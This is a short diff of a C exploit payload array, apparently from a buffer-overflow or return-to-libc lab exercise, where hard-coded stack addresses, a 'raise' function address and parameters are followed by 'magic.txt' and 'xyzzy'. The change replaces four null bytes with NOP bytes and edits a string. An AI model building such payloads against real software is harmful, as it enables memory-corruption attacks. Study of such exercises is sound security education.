@@ -34,10 +34,10 @@ unsigned char payload[] =
 	"\x5a\xc3\xff\xbf"					//<second param> 0xBFFFC35A
 	"\x06\x00\x00\x00"					//<third param>
 	"\x40\x1d\xe1\xb3"					//<raise> 0xb3e11d40
-	"\x00\x00\x00\x00"
+	"\x90\x90\x90\x90"
 	"\x0c\x00\x00\x00"					//<first param>
 	"magic.txt\x00" 					//0xBFFFC350
-	"xyzzy\x00"; 						//0xBFFFC35A						
+	"xyzzy!\x00"; 						//0xBFFFC35A						
 
 
 	/* ------------------------------------	*/
